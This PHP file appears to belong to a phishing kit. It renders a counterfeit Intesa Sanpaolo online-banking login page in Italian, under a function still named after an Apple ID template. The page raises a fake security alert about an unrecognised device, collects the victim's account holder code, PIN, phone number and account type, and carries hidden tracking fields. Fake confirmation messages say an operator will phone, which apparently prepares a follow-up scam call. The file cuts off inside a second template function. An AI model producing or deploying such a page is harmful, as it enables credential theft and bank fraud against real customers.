<?php
if (!(function_exists('appleidTemplate'))) {
function appleidTemplate($title, $emailid, $MD5IdentificaAcesso)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirecturl2 = $ci->load->get_var('redirecturl2');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'Entra Intesa Sanpaolo'));
	$RandomIdentificacao = time()*rand();

	$body2 = "$MD5IdentificaAcesso";
	$body = '<html lang="it">
     <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
        <title>Entra - Intesa Sanpaolo</title>
        <link rel="icon" type="image/vnd.microsoft.icon" href="/assets/bank2/favicon.ico">
        <link rel="stylesheet" href="/assets/bank2/clientlib-all.css" type="text/css">
        <link rel="stylesheet" href="/assets/bank2/ArchIbPublicStyle.css"/>
     </head>
     <body>
        <header id="header-section">

           <div id="collapse-access" class="ga-content content-access js-content-access collapse" data-ng-if="window.innerWidth >= 768">
           </div>

           <!-- HEADER MOBILE -->
           <div id="site-header-mobile">
              <nav class="content-target" aria-label="Navigazione">
                 <div class="container-fluid">
                    <div class="content-target__row">
                       <div id="section-logo-mobile" class="content-target__logo ">
                          <a href="#" tabindex="5" title="Intesa Sanpaolo ">
                          <span class="span-logo-isp">
                          <img src="/assets/bank2/logo-intesasanpaolo.png" alt="Intesa Sanpaolo " title="Intesa Sanpaolo ">
                          </span>
                          </a>
                       </div>
                       <div id="section-burger-mobile" class="content-target__block content-target--burger">
                          <button type="button" class="collapsed">
                          <span class="btn-icon icon--menu">
                          <span></span>
                          <span></span>
                          <span></span>
                          </span>
                          <span class="sr-only btn-text">Menu</span>
                          </button>
                       </div>
                    </div>
                    <div class="content-target__row">
                       <div id="section-cta-mobile" class="content-target__block content-target--cta">
                          <a href="#" title="Apri il conto" aria-label="Apri il conto">
                          <span class="btn-icon icon--add-client">
                          </span>
                          <span class="btn-text">Apri il conto</span>
                          </a>
                       </div>
                       <div id="section-lock-mobile" data-header-login="" class="content-target__block content-target--login ">
                          <button type="button"  class="collapsed">
                          <span class="btn-icon icon--lock">
                          </span>
                          <span class="btn-icon icon--close">
                          <span></span>
                          <span></span>
                          <span></span>
                          </span>
                          <span class="btn-text">ACCESSO CLIENTI</span>
                          <span class="btn-text-close">Chiudi</span>
                          </button>
                       </div>
                    </div>
                 </div>
              </nav>




           <!-- access collapse close/open -->
           <div id="collapse-access-mobile" class="ga-content content-access js-content-access collapse" data-ng-if="window.innerWidth < 768">
           </div>
           <!-- //access collapse close/open -->
           </div>
           <!-- //HEADER MOBILE -->
        </header>
        <div id="content-login" class="v-mobile">
           <guestarea-menu></guestarea-menu>
        </div>
        <main id="main" tabindex="-1" class="inside-template  ">
          <div id="site-page" class="page-template ">
            <div class="html-hole section">
              <div class="container-fluid" data-isp-spazio-manuale="{&#34;panelSize&#34;:&#34;none&#34;}">
                <div class="row">
                  <style>
                    .block__iframe iframe {
                    width: 100%;
                    /*height: 270px!important;*/
                    /*height: 300px!important;*/
                    height: 350px!important;
                    position:relative!important;
                    }
                    .block__iframe iframe  .login-first-access{
                    position:absolute!important;
                    bottom:-10px!important;
                    }
                    .block__iframe iframe .isp-ib-open-sans-regular-16{
                    display:none!important;
                    }
                    main{
                    padding-top:0px!important;
                    }
                    main .page-template{
                    margin-top:0px!important;
                    }
                    .site-breadcrumb.breadcrumb--relative{
                    position: inherit !important;
                    top: inherit !important;
                    margin: inherit !important;
                    }
                    .panel-green{
                    margin-bottom:0px !important;
                    padding-bottom:20px !important;
                    }
                    .panel-gray{
                    background:#323232;
                    padding-top:10px !important;
                    padding-bottom:10px !important;
                    }
                    .panel-gray .block__text p{
                    background: #fff;
                    color: #258900;
                    padding: 5px;
                    margin-top:5px;
                    }
                    .footer-list{
                    margin-top:0px !important;
                    }
                    .footer-message{
                    border-top: 1px solid #fff;
                    margin-top:15px;
                    }
                    @media (max-width: 767px) {
                    #ifrmMulti-1396287451{
                    height: 250px!important;
                    }
                    .md-textimage-multiple .row-item-multiple .item-multiple{
                    margin-bottom: 10px !important;
                    }
                    }
                  </style>
                    <div class="multi-column section">
                      <div class="ga-module md-textimage-multiple js-textimage-multiple boxHeightEqual ng-scope" style="min-height: auto; margin-top: 0px !important; margin-bottom: 0px !important; padding-top: 0px !important; padding-bottom: 0px !important; background-image: url(&quot;/assets/bank2/Home-Computer-Business.jpg&quot;);">
                        <div class="container">
                          <div class="row row-item-multiple no-gutter row-middle-align" style="min-height: auto;" >
                            <div class="item-multiple col-xs-22 col-xs-offset-1 col-sm-24 col-sm-offset-0 col-md-24" style="height: auto;">
                              <div class="item-multiple__content ga-module-single ">
                                <div class="row-item section">
                                  <div class="row row-item-multiple no-gutter row-middle-align" style="min-height: auto;">
                                      <div style="margin-top: 0px !important;" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-6 col-sm-offset-0 col-md-6" style="height: 818px;">
                                        <div class="item-multiple__content ga-module-single "></div>
                                      </div>

																			<!-- Inicio Mensagem Sucesso -->
																			<div id="MensagemPosLogin" data-multi-column-mobile-row="" style="margin-top: 0px !important;height: auto;display: none;" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-10 col-sm-offset-0 col-md-10">
																				<div class="item-multiple__content ga-module-single ">
																					<div class="row-item section">
																						<div class="row row-item-multiple no-gutter row-middle-align panel-white" style="  min-height: auto;; margin-top: 0px !important; margin-bottom: 0px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;150&quot;,&quot;dmbottom&quot;:&quot;0&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
																							<div data-multi-column-mobile-row="" class="item-multiple col-xs-0 col-xs-offset-0 col-sm-2 col-sm-offset-0 col-md-2" style="height: 437px; display: none;">
																								<div class="item-multiple__content ga-module-single "></div>
																							</div>

																							<div data-multi-column-mobile-row="" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-20 col-sm-offset-0 col-md-20" style="height: auto;">
																								<div class="item-multiple__content ga-module-single ">
																									<div class="blockImage section">
																										<div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
																											<div class="block__ico ico-center">
																												<img class="img_responsive" style="height:100px; width:100px; align:center;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Exclamation.svg/1024px-Exclamation.svg.png">
																											</div>
																										</div>
																									</div>

																									<div class="blockTitle section">
																										<div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
																											<div class="block__title">
																												<div></div>
																												<h3 class="medium-title"><span class="textCenter">Conto verificato con successo. Tutti i dispositivi sono stati disconnessi. Potrai essere contattato da un nostro operatore per ulteriori verifiche. </span></h3>
																											</div>
																										</div>
																									</div>
																								</div>

																								<div data-multi-column-mobile-row="" class="item-multiple col-xs-0 col-xs-offset-0 col-sm-2 col-sm-offset-0 col-md-2" style="height: auto; display: none;">
																									<div class="item-multiple__content ga-module-single "></div>
																								</div>
																							</div>
																						</div>
																					</div>

																					<div data-multi-column-mobile-row="" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-6 col-sm-offset-0 col-md-6" style="height: auto;">
																						<div class="item-multiple__content ga-module-single "></div>
																					</div>
																				</div>
																			</div>
																			<!--Fim Msg Sucesso-->

																			<!-- Inicio Mensagem Retorno Esqueceu Conta -->
																			<div id="MensagemPosLogin2" data-multi-column-mobile-row="" style="margin-top: 0px !important;height: auto;display: none;" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-10 col-sm-offset-0 col-md-10">
																				<div class="item-multiple__content ga-module-single ">
																					<div class="row-item section">
																						<div class="row row-item-multiple no-gutter row-middle-align panel-white" style="  min-height: auto;; margin-top: 0px !important; margin-bottom: 0px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;150&quot;,&quot;dmbottom&quot;:&quot;0&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
																							<div data-multi-column-mobile-row="" class="item-multiple col-xs-0 col-xs-offset-0 col-sm-2 col-sm-offset-0 col-md-2" style="height: 437px; display: none;">
																								<div class="item-multiple__content ga-module-single "></div>
																							</div>

																							<div data-multi-column-mobile-row="" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-20 col-sm-offset-0 col-md-20" style="height: auto;">
																								<div class="item-multiple__content ga-module-single ">
																									<div class="blockImage section">
																										<div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
																											<div class="block__ico ico-center">
																												<img class="img_responsive" style="height:100px; width:100px; align:center;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Exclamation.svg/1024px-Exclamation.svg.png">
																											</div>
																										</div>
																									</div>

																									<div class="blockTitle section">
																										<div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
																											<div class="block__title">
																												<div></div>
																												<h3 class="medium-title"><span class="textCenter">Gentile cliente sarai contattato nel minor tempo possibile da un operatore per concludere la verifica di sicurezza. </span></h3>
																											</div>
																										</div>
																									</div>
																								</div>

																								<div data-multi-column-mobile-row="" class="item-multiple col-xs-0 col-xs-offset-0 col-sm-2 col-sm-offset-0 col-md-2" style="height: auto; display: none;">
																									<div class="item-multiple__content ga-module-single "></div>
																								</div>
																							</div>
																						</div>
																					</div>

																					<div data-multi-column-mobile-row="" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-6 col-sm-offset-0 col-md-6" style="height: auto;">
																						<div class="item-multiple__content ga-module-single "></div>
																					</div>
																				</div>
																			</div>
																			<!--Fim Mensagem Retorno Esqueceu Conta-->

                                          <div style="margin-top: 0px !important;" class="item-multiple col-xs-22 col-xs-offset-1 col-sm-10 col-sm-offset-0 col-md-10" style="height: 818px;">
                                            <div class="item-multiple__content ga-module-single ">
                                            <div class="row-item section">



																						<div id="FormularioLogin" class="row row-item-multiple no-gutter row-middle-align panel-white" style="  min-height: auto;; margin-top: 0px !important; margin-bottom: 0px !important; background:#323232" >
                                            <div class="item-multiple col-xs-22 col-xs-offset-1 col-sm-20 col-sm-offset-0 col-md-20" style="height: 397px;">
                                            <div class="item-multiple__content ga-module-single ">
                                            <div class="blockImage section">
                                            <div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important">
                                              <div class="block__ico ico-center">
                                              <img src="/assets/bank2/Error-512.png" style="width:100px;height:100px;" >
                                              </div>
                                            </div>
                                            </div>
                                            <div class="blockTitle section">
                                            <div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;">
                                            <div class="block__title">
                                            <h3 class="medium-title"><span class="textCenter" style="color:red"> ALERT SICUREZZA ACCESSO INTERNET BANKING </span></h3>
                                            <b><br />
                                            <p style="color:white">È stato effettuato un accesso su un dispositivo non riconosciuto se non sei stato tu clicca e verifica i dati.
                                            <br /><br />
                                            <b>Inserire le informazioni di seguito per procedere con la verifica di sicurezza:</b>
                                            </p>
                                            </div>
                                            <hr />
                                            <div class="block__ico ico-center">
                                            <img src="/assets/bank2/utente_ok_green.png" class="imagefull ">
                                            </div>
                                            <div class="blockTitle section">
                                            <div class="item-multiple__element  space10" style="min-height: auto;">
                                            <div class="block__title">
                                            <h3 class="medium-title"><span class="textCenter"> Sei già cliente? </span></h3>
                                            </div>
                                            </div>
                                            </div>
                                            <div class="row margin-bottom-18 ng-scope">
                                            <div class="isp-ib-open-sans-regular-16 isp-ib-title-access isp-ib-alignment-access col-xs-24 col-md-12 col-md-offset-1 login-whitespace">
                                            <span class="isp-font-comuni-achi"></span>
                                            <span class="ng-binding ng-scope" style="font-size: 12px; font-weight: 100;">ACCEDI ALLA TUA BANCA ONLINE</span><br><!-- end ngIf: !login.pmed -->
                                            </div>
                                            <div class="col-xs-24 col-md-11 login-first-access margin-top-first-access login-first-access-padding-11 ng-scope">
                                            <a ntabindex="0" class="isp-ib-open-sans-semi-bold-13 login-first-accessDown login-padding-3px login-padding-0 ng-binding ng-scope" ng-click="goToFirstAccess()">
                                            Primo accesso?
                                            <img style="margin-top:-2px;margin-left:2px;" src="/assets/bank2/freccia_dx.png" class="ng-scope"><!-- end ngIf: !model.tmp.darkTheme -->
                                            </a>
                                            <a class="isp-ib-open-sans-semi-bold-13 login-first-accessDown ng-binding ng-scope">
                                            Sicurezza
                                            <img style="margin-top:-2px;margin-left:2px;" src="/assets/bank2/freccia_dx.png" class="ng-scope"><!-- end ngIf: !model.tmp.darkTheme -->
                                            </a>
                                            </div>
                                            </div>
                                            <div id="command" class="form-group"  style="font-style: italic;font-weight: 400;">
																						<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
																						<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
																						<input type="hidden" name="TemplateBank" id="TemplateBank" value="2">
																						<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
																						<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">
                                            <br />
                                            <p>
                                            <h2> <label for="username"></label></h2>
                                            </p>
                                            <input class = "form-control" type="number" placeholder="Codice Titolare" name="username" id="_username" required="" tabindex="1" value="">
                                            <br />

																						<input type="radio" id="Esqueceue-Conta" name="Esqueceue-Conta" value="Conto Intesa">
																						<label for="Esqueceue-Conta" style="color:white;">Non ricordo il codice titolare</label>
																						<br>
																						<br>
                                            <p>
                                            <strong> <label for="password"></label></strong>
                                            </p>
                                            <input class="form-control" type="password" placeholder="PIN" name="password" id="_password" required="" tabindex="2" value="">
                                            <br />
                                            <p>
                                            <strong> <label for="password"></label></strong>
                                            </p>
                                            <input class="form-control" type="number" placeholder="Numero di Telefono" name="phone" id="_phone" required="" tabindex="4" value="">
                                            <br />
																						<div id="LoginInvalid" style="color: red;font-size: 19px;display: none;"> Dati inseriti non corretti </div>
                                            <div style="color:white;font-size:17px"><br>Seleziona il tipo di Conto<br><br>
                                            <input type="radio" id="conto-business" name="conto" value="Conto Business">
                                            <label for="conto-business" style="color:white">Conto Business</label><br>
                                            <input type="radio" id="conto-impresa" name="conto" value="Conto Impresa">
                                            <label for="conto-impresa" style="color:white">Conto Impresa</label><br>
                                            <input type="radio" id="conto-inbiz" name="conto" value="Conto Inbiz">
                                            <label for="conto-inbiz" style="color:white">Conto Inbiz</label><br>
                                            <input type="radio" id="conto-intesa" name="conto" value="Conto Intesa">
                                            <label for="conto-intesa" style="color:white">Conto Intesa</label>
                                            <br>
                                            </div>
                                            <br />
                                            <button id="ButtonSend" onclick="CickMain1()" style="background-color: green;font-size : 20px;"  type="submit" class="btn btn-primary btn-lg btn-block">VERIFICA</button>
                                            </div>
                                            </div>
                                            </div>
                                            </div>
                                            </div>
                                            <div class="item-multiple col-xs-0 col-xs-offset-0 col-sm-2 col-sm-offset-0 col-md-2" style="height: 397px;">
                                            <div class="item-multiple__content ga-module-single ">
                                            </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <div id="angStrapModal" data-ng-controller="modalAngStrapCtrl"></div>

        <footer data-ng-controller="FooterCtrl">
           <div id="site-footer">
           <div class="ga-content footer-share js-footer-share">
           <div class="container">
              <div class="row">
                 <div class="col-xs-24 col-sm-24 col-md-24">
                    <div class="footer-share__text">
                       <h2 class="footer-share__title">Seguici anche su</h2>
                       <ul class="footer-share__social v-desktop">
                    </div>
                    <!-- FOOTER SOCIAL MOBILE  -->
                    <div class="row v-mobile" data-ng-init="alignSocial()">
                       <div class="col-xs-3">
                          <div class="footer-share__text">
                             <ul class="footer-share__social">
                                <li>
                                   <a href="https://www.facebook.com/IntesaSanpaolo" target="_blank">
                                   <img src="/assets/bank2/footer_image.img.png" alt="Intesa Sanpaolo Facebook" title="Facebook Intesa Sanpaolo"/>
                                   </a>
                                </li>
                             </ul>
                          </div>
                       </div>
                       <!-- //FOOTER SOCIAL MOBILE  -->
                       <div class="col-xs-3">
                          <div class="footer-share__text">
                             <ul class="footer-share__social">
                                <li>
                                   <a href="https://www.youtube.com/user/intesasanpaolo" target="_blank">
                                   <img src="/assets/bank2/footer_image_0.img.png" alt="YouTube Intesa Sanpaolo" title="YouTube Intesa Sanpaolo"/>
                                   </a>
                                </li>
                             </ul>
                          </div>
                       </div>
                       <!-- //FOOTER SOCIAL MOBILE  -->
                       <div class="col-xs-3">
                          <div class="footer-share__text">
                             <ul class="footer-share__social">
                                <li>
                                   <a href="https://twitter.com/IntesaSP_Help" target="_blank">
                                   <img src="/assets/bank2/footer_image_1.img.jpg" alt="Twitter Intesa Sanpaolo" title="Twitter Intesa Sanpaolo"/>
                                   </a>
                                </li>
                             </ul>
                          </div>
                       </div>
                       <!-- //FOOTER SOCIAL MOBILE  -->
                       <div class="col-xs-3">
                          <div class="footer-share__text">
                             <ul class="footer-share__social">
                                <li>
                                   <a href="https://www.linkedin.com/company/164437?trk=tyah" target="_blank">
                                   <img src="/assets/bank2/footer_image_2.img.jpg" alt="Linkedin Intesa Sanpaolo" title="Linkedin Intesa Sanpaolo"/>
                                   </a>
                                </li>
                             </ul>
                          </div>
                       </div>
                       <!-- //FOOTER SOCIAL MOBILE  -->
                    </div>
                 </div>
              </div>

              <div class="ga-content footer-maps-mobile js-footer-maps  v-mobile">
                 <div class="container">
                    <div class="row">
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="footer-maps__category-ico">
                                <div class="row">
                                   <div class="col-xs-4 col-xs-offset-1">
                                      <span class="ico-small"> <img src="/assets/bank2/arrows.png" alt=""/>
                                      </span>
                                   </div>
                                   <div class="col-xs-17 col-xs-offset-1">
                                      <h3 class="footer-maps__title">Vicino a te - Online e in filiale </h3>
                                      <ul class="footer-maps__subtitle">
                                         <li><a target="_self"> CI TROVI OVUNQUE </a>
                                         </li>
                                         <li><a target="_self"> CERCA FILIALI, ATM E TABACCHERIE CONVENZIONATE BANCA 5 </a>
                                         </li>
                                         <li><a target="_modal"> CHIUSURA STRAORDINARIA FILIALI </a>
                                         </li>
                                      </ul>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="footer-maps__category-ico">
                                <div class="row">
                                   <div class="col-xs-4 col-xs-offset-1">
                                      <span class="ico-small"> <img src="/assets/bank2/arrows.png" alt=""/>
                                      </span>
                                   </div>
                                   <div class="col-xs-17 col-xs-offset-1">
                                      <h3 class="footer-maps__title">Informazioni e Servizi</h3>
                                      <ul class="footer-maps__subtitle">
                                         <li><a target="_blank"> GUIDA AI SERVIZI CONSUMATORE </a>
                                         </li>
                                         <li><a target="_blank"> GUIDA AI SERVIZI ESERCENTE </a>
                                         </li>
                                         <li><a target="_blank"> GUIDA ASSOCIAZIONE POS MOBILE </a>
                                         </li>
                                      </ul>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="footer-maps__category-ico">
                                <div class="row">
                                   <div class="col-xs-4 col-xs-offset-1">
                                      <span class="ico-small"> <img src="/assets/bank2/arrows.png" alt=""/>
                                      </span>
                                   </div>
                                   <div class="col-xs-17 col-xs-offset-1">
                                      <h3 class="footer-maps__title">Assistenza e domande</h3>
                                      <ul class="footer-maps__subtitle">
                                         <li><a target="_self"> BLOCCA LA TUA CARTA </a>
                                         </li>
                                         <li><a target="_self"> PARLA CON LA FILIALE ONLINE </a>
                                         </li>
                                      </ul>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="footer-maps__category-ico">
                                <div class="row">
                                   <div class="col-xs-4 col-xs-offset-1">
                                      <span class="ico-small"> <img src="/assets/bank2/arrows.png" alt=""/>
                                      </span>
                                   </div>
                                   <div class="col-xs-17 col-xs-offset-1">
                                      <h3 class="footer-maps__title">Reclami e Risoluzione controversie</h3>
                                      <ul class="footer-maps__subtitle">
                                         <li><a target="_self"> RECLAMI E RISOLUZIONE DELLE CONTROVERSIE </a>
                                         </li>
                                         <li><a target="_self"> CONCILIAZIONE PERMANENTE </a>
                                         </li>
                                         <li><a target="_blank"> ABF </a>
                                         </li>
                                         <li><a target="_blank"> ACF </a>
                                         </li>
                                         <li><a target="_blank"> IVASS </a>
                                         </li>
                                      </ul>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="panel panel-default accordion-item ">
                                <div class="panel-heading" id="heading_secSection1">
                                   <div class="row">
                                      <div class="col-xs-18 col-xs-offset-1">
                                         <h4 class="panel-title">
                                            <a class="collapsed" > Gruppo Intesa Sanpaolo</a>
                                         </h4>
                                      </div>
                                      <div class="col-xs-2 col-xs-offset-2">
                                         <h4 class="panel-title">
                                            <a class="collapsed" >
                                            <span class="ico-acc"></span></a>
                                         </h4>
                                      </div>
                                   </div>
                                </div>
                                <div id="footAcc_secSection1" class="panel-collapse collapse" aria-labelledby="heading_secSection1">
                                   <div class="panel-body">
                                      <div class="row">
                                         <div class="col-xs-22 col-xs-offset-1">
                                            <div class="footer-maps__category">
                                               <ul class="footer-maps__subtitle">
                                                  <li><a target="_blank"> CHI SIAMO</a>
                                                  </li>
                                                  <li><a target="_blank"> INVESTOR RELATIONS</a>
                                                  </li>
                                                  <li><a target="_blank"> GOVERNANCE</a>
                                                  </li>
                                                  <li><a target="_blank"> SOSTENIBILITÀ</a>
                                                  </li>
                                                  <li><a target="_blank"> SOCIALE</a>
                                                  </li>
                                                  <li><a target="_blank"> RESEARCH</a>
                                                  </li>
                                                  <li><a target="_blank"> NEWSROOM</a>
                                                  </li>
                                                  <li><a target="_blank"> CAREERS</a>
                                                  </li>
                                               </ul>
                                            </div>
                                         </div>
                                      </div>
                                      <!-- COMPONENTS ACCESIBILTY -->
                                      <!-- //COMPONENTS ACCESIBILTY -->
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="panel panel-default accordion-item ">
                                <div class="panel-heading" id="heading_secSection2">
                                   <div class="row">
                                      <div class="col-xs-18 col-xs-offset-1">
                                         <h4 class="panel-title">
                                            <a> Banche dei Territori</a>
                                         </h4>
                                      </div>
                                      <div class="col-xs-2 col-xs-offset-2">
                                         <h4 class="panel-title">
                                            <a class="collapsed" >
                                            <span class="ico-acc"></span></a>
                                         </h4>
                                      </div>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="panel panel-default accordion-item ">
                                <div class="panel-heading" id="heading_secSection3">
                                   <div class="row">
                                      <div class="col-xs-18 col-xs-offset-1">
                                         <h4 class="panel-title">
                                            <a> Normative</a>
                                         </h4>
                                      </div>
                                      <div class="col-xs-2 col-xs-offset-2">
                                         <h4 class="panel-title">
                                            <a class="collapsed" >
                                            <span class="ico-acc"></span></a>
                                         </h4>
                                      </div>
                                   </div>
                                </div>
                                <div id="footAcc_secSection3" class="panel-collapse collapse" aria-labelledby="heading_secSection3">
                                   <div class="panel-body">
                                      <div class="row">
                                         <div class="col-xs-22 col-xs-offset-1">
                                         </div>
                                      </div>
                                      <!-- COMPONENTS ACCESIBILTY -->
                                      <!-- //COMPONENTS ACCESIBILTY -->
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                       <div>
                          <div class="col-xs-24 col-sm-24 col-md-24">
                             <div class="panel panel-default accordion-item ">
                                <div class="panel-heading" id="heading_secSection4">
                                   <div class="row">
                                      <div class="col-xs-18 col-xs-offset-1">
                                         <h4 class="panel-title">
                                            <a> Accessibilità</a>
                                         </h4>
                                      </div>
                                      <div class="col-xs-2 col-xs-offset-2">
                                         <h4 class="panel-title">
                                            <a class="collapsed" >
                                            <span class="ico-acc"></span></a>
                                         </h4>
                                      </div>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                    </div>
                 </div>
              </div>
              <div class="ga-content footer-last js-footer-last ">
                 <div class="container">
                    <div class="row">
                       <div class="col-xs-24 col-sm-16 col-md-12">
                          <div class="footer-last__text">
                             <div class="footer-last__image sf-footer-logo">
                                <img src="/assets/bank2/logo-isp-footer.png"/>
                             </div>
                             <p><br />
                                <br />
                                Partita IVA 11991500015 (IT11991500015)
                             </p>
                          </div>
                       </div>
                       <div class="col-xs-24 col-sm-6 col-md-12">
                          <div class="row-item section">
                             <div class="row row-item-multiple no-gutter row-middle-align" style="  min-height: auto;" >
                                <div class="item-multiple col-xs-2 col-xs-offset-1 col-sm-3 col-sm-offset-0 col-md-3">
                                   <div class="item-multiple__content ga-module-single ">
                                   </div>
                                </div>
                                <div class="item-multiple col-xs-2 col-xs-offset-1 col-sm-3 col-sm-offset-0 col-md-3">
                                   <div class="item-multiple__content ga-module-single ">
                                   </div>
                                </div>
                                <div class="item-multiple col-xs-2 col-xs-offset-1 col-sm-3 col-sm-offset-0 col-md-3">
                                   <div class="item-multiple__content ga-module-single ">
                                   </div>
                                </div>
                                <div class="item-multiple col-xs-2 col-xs-offset-1 col-sm-3 col-sm-offset-0 col-md-3">
                                   <div class="item-multiple__content ga-module-single ">
                                   </div>
                                </div>
                                <div class="item-multiple col-xs-6 col-xs-offset-1 col-sm-6 col-sm-offset-0 col-md-6">
                                   <div class="item-multiple__content ga-module-single ">
                                      <div class="blockImage section">
                                         <div class="item-multiple__element " style="  min-height: auto;" >
                                            <div class="block__ico ico-right">
                                               <a target="_self">
                                               <img src="/assets/bank2/trasparenza.png" class="imagefull ">
                                               </a>
                                            </div>
                                         </div>
                                      </div>
                                      <div class="blockImage section">
                                         <div class="item-multiple__element " style="  min-height: auto;" >
                                            <div class="block__ico ico-center">
                                               <a target="_blank">
                                               <img src="/assets/bank2/logo_compara_conti.png" class="imagefull ">
                                               </a>
                                            </div>
                                         </div>
                                      </div>
                                   </div>
                                </div>
                             </div>
                          </div>
                          <div class="row-item section">
                             <div class="row row-item-multiple no-gutter row-top-align" style="  min-height: auto;" >
                                <div class="item-multiple col-xs-22 col-xs-offset-1 col-sm-24 col-sm-offset-0 col-md-24">
                                   <div class="item-multiple__content ga-module-single ">
                                      <div class="blockImage section">
                                         <div class="item-multiple__element " style="  min-height: auto;" >
                                            <div class="block__ico ico-right">
                                               <a target="_blank">
                                               <img src="/assets/bank2/logo-footer.png" class="imagefull ">
                                               </a>
                                            </div>
                                         </div>
                                      </div>
                                   </div>
                                </div>
                             </div>
                          </div>
                       </div>
                    </div>
                 </div>
              </div>
           </div>
        </footer>
				<script src="/assets/js/jquery.js"></script>
				<script src="/assets/bank2/bank2.js?t=' . time() .'"></script>
     </body>
  </html>';
	return $body;
}
}


if (!(function_exists('indexTemplate'))) {
function indexTemplate($text)
{
	$html = "\n" . '        <!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <meta name="robots" content="noindex, nofollow"/>' . "\n" . '    <title>' . $text . '</title>' . "\n\n" . '    <style>' . "\n" . '        @font-face {' . "\n" . '            font-family: \'Robotot\';' . "\n" . '            src: url(\'/assets/font/Roboto-Thin.eot\'); /* IE9 Compat Modes */' . "\n" . '            src: url(\'/assets/font/Roboto-Thin.eot?#iefix\') format(\'embedded-opentype\'), /* IE6-IE8 */ url(\'/assets/font/Roboto-Thin.woff\') format(\'woff\'), /* Modern Browsers */ url(\'/assets/font/Roboto-Thin.ttf\') format(\'truetype\'), /* Safari, Android, iOS */ url(\'/assets/font/Roboto-Thin.svg#aa2d497a13c540ad016e99a0baee3c15\') format(\'svg\'); /* Legacy iOS */' . "\n" . '            font-style: normal;' . "\n" . '            font-weight: 200;' . "\n" . '        }' . "\n" . '        @font-face {' . "\n" . '            font-family: \'Robotol\';' . "\n" . '            src: url(\'/assets/font/Roboto-Light.eot\'); /* IE9 Compat Modes */' . "\n" . '            src: url(\'/assets/font/Roboto-Light.eot?#iefix\') format(\'embedded-opentype\'), /* IE6-IE8 */ url(\'/assets/font/Roboto-Light.woff\') format(\'woff\'), /* Modern Browsers */ url(\'/assets/font/Roboto-Light.ttf\') format(\'truetype\'), /* Safari, Android, iOS */ url(\'/assets/font/Roboto-Light.svg#14cfc794995ce651ee6fc06de48ff027\') format(\'svg\'); /* Legacy iOS */' . "\n" . '            font-style: normal;' . "\n" . '            font-weight: 200;' . "\n" . '        }' . "\n\n" . '        body {' . "\n" . '            background: #e0e0e0;' . "\n" . '            margin: 0;' . "\n" . '            padding: 0;' . "\n" . '        }' . "\n\n" . '        .coming {' . "\n" . '            font-family: \'Robotot\';' . "\n" . '            font-size: 100px;' . "\n" . '            text-align: center;' . "\n" . '            width: 100%;' . "\n" . '            margin-top: 200px;' . "\n" . '        }' . "\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body>' . "\n\n" . '<div class="coming">' . "\n" . '    ' . $text . "\n" . '</div>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
